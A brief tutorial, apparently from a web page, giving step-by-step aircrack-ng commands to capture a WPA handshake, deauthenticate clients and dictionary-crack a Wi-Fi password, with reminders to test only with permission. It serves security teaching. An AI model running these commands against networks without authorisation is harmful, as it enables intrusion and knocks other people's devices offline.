📶 Wi-Fi Hacking (Ethical Hacking + Simulator)

This guide + simulator helps you understand how ethical hackers test Wi-Fi network security. Always get permission before testing.

1. Enable Monitor Mode

Put your Wi-Fi adapter into monitor mode using:

airmon-ng start wlan0

2. Scan Wi-Fi Networks

Find nearby networks and get BSSID & channel:

airodump-ng wlan0mon

3. Capture Handshake

Target a specific network and capture handshake:

airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

4. Disconnect Client (Optional)

Force a device to reconnect to capture handshake faster:

aireplay-ng --deauth 5 -a [router BSSID] -c [client MAC] wlan0mon

5. Crack Password (Dictionary Attack)

Crack captured handshake with a wordlist:

aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap

6. Ethical Reminder

⚠️ Always test on your own network or with written permission. Unauthorized Wi-Fi hacking is ILLEGAL.
